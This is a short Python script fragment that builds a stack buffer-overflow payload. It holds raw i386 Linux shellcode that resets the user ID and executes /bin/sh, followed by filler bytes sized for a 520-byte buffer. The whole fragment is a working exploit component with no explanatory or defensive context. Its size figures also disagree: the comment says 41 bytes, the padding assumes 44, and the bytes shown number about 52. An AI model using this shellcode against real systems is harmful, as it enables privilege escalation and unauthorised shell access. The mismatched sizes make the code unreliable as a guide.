import sys
payload = b''
payload += b'\x31\xc0\xb0\x31\x31\xdb\xb3\xe8\x66\x81\xc3\x02\x03\x89\xcb\xcd\x80\x31\xc0\xb0\x46\x89\xd9\x89\xd3\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
# Add shellcode(41bytes).
payload += b'A' * (520 - 44 - 4) # Fill with any value.
